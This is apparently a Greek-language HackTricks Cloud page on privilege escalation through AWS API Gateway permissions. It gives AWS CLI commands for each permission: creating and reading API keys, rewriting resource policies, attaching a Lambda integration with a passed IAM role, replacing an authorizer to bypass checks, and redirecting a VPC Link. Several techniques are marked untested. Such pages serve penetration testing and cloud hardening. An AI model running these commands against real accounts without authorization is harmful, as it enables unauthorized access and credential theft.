# AWS - Ανύψωση προνομίων Apigateway

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
{% endhint %}

## Apigateway

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### `apigateway:POST`

Με αυτήν την άδεια μπορείτε να δημιουργήσετε κλειδιά API για τις διαμορφωμένες APIs (ανά περιοχή).
```bash
aws --region <region> apigateway create-api-key
```
**Πιθανή Επίδραση:** Δεν μπορείτε να πραγματοποιήσετε προνόμια αυξημένων δικαιωμάτων με αυτήν την τεχνική, αλλά ενδέχεται να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:GET`

Με αυτήν την άδεια μπορείτε να λάβετε τα δημιουργημένα κλειδιά API των παραμετροποιημένων API (ανά περιοχή).
```bash
aws --region <region> apigateway get-api-keys
aws --region <region> apigateway get-api-key --api-key <key> --include-value
```
**Πιθανή Επίπτωση:** Δεν μπορείτε να πραγματοποιήσετε προνόμια προνομιούχου με αυτήν την τεχνική, αλλά ενδέχεται να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:UpdateRestApiPolicy`, `apigateway:PATCH`

Με αυτές τις άδειες είναι δυνατή η τροποποίηση της πολιτικής πόρων ενός API για να δώσετε στον εαυτό σας πρόσβαση για να το καλέσετε και να καταχραστείτε την πιθανή πρόσβαση που μπορεί να έχει το API gateway (όπως η εκκίνηση ενός ευάλωτου λάμδα).

{% code overflow="wrap" %}
```bash
aws apigateway update-rest-api \
--rest-api-id api-id \
--patch-operations op=replace,path=/policy,value='"{\"jsonEscapedPolicyDocument\"}"'
```
{% endcode %}

**Πιθανές Επιπτώσεις:** Συνήθως, δεν θα μπορέσετε να πραγματοποιήσετε άμεση αύξηση προνομίων με αυτήν την τεχνική, αλλά ενδέχεται να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:PutIntegration`, `apigateway:CreateDeployment`, `iam:PassRole`

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

Ένας επιτιθέμενος με τα δικαιώματα `apigateway:PutIntegration`, `apigateway:CreateDeployment` και `iam:PassRole` μπορεί **να προσθέσει μια νέα ενσωμάτωση σε ένα υπάρχον API Gateway REST API με μια συνάρτηση Lambda που έχει συνδεδεμένο ένα ρόλο IAM**. Ο επιτιθέμενος μπορεί στη συνέχεια **να ενεργοποιήσει τη συνάρτηση Lambda για να εκτελέσει αυθαίρετο κώδικα και ενδεχομένως να αποκτήσει πρόσβαση στους πόρους που σχετίζονται με τον ρόλο IAM**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"
LAMBDA_ROLE_ARN="arn:aws:iam::account-id:role/lambda-role"

# Add a new integration to the API Gateway REST API
aws apigateway put-integration --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --type AWS_PROXY --integration-http-method POST --uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations --credentials $LAMBDA_ROLE_ARN

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανή Επίπτωση**: Πρόσβαση σε πόρους που σχετίζονται με τον ρόλο IAM της Lambda λειτουργίας.

### `apigateway:UpdateAuthorizer`, `apigateway:CreateDeployment`

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateAuthorizer` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει έναν υπάρχοντα ελεγκτή του API Gateway** για να παρακάμψει τους ελέγχους ασφαλείας ή να εκτελέσει αυθαίρετο κώδικα όταν γίνονται αιτήσεις στο API. 

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
AUTHORIZER_ID="your-authorizer-id"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"

# Update the API Gateway authorizer
aws apigateway update-authorizer --rest-api-id $API_ID --authorizer-id $AUTHORIZER_ID --authorizer-uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανή Επίπτωση**: Παράκαμψη ελέγχων ασφαλείας, μη εξουσιοδοτημένη πρόσβαση σε πόρους του API.

### `apigateway:UpdateVpcLink`

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

Ένας επιτιθέμενος με την άδεια `apigateway:UpdateVpcLink` μπορεί **να τροποποιήσει ένα υπάρχον VPC Link για να δείχνει σε ένα διαφορετικό Network Load Balancer, πιθανώς ανακατευθύνοντας την κυκλοφορία του ιδιωτικού API σε μη εξουσιοδοτημένους ή κακόβουλους πόρους**.
```bash
bashCopy codeVPC_LINK_ID="your-vpc-link-id"
NEW_NLB_ARN="arn:aws:elasticloadbalancing:region:account-id:loadbalancer/net/new-load-balancer-name/50dc6c495c0c9188"

# Update the VPC Link
aws apigateway update-vpc-link --vpc-link-id $VPC_LINK_ID --patch-operations op=replace,path=/targetArns,value="[$NEW_NLB_ARN]"
```
**Πιθανή Επίπτωση**: Μη εξουσιοδοτημένη πρόσβαση σε ιδιωτικούς πόρους του API, παρεμπόδιση ή διακοπή της κίνησης του API. 

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
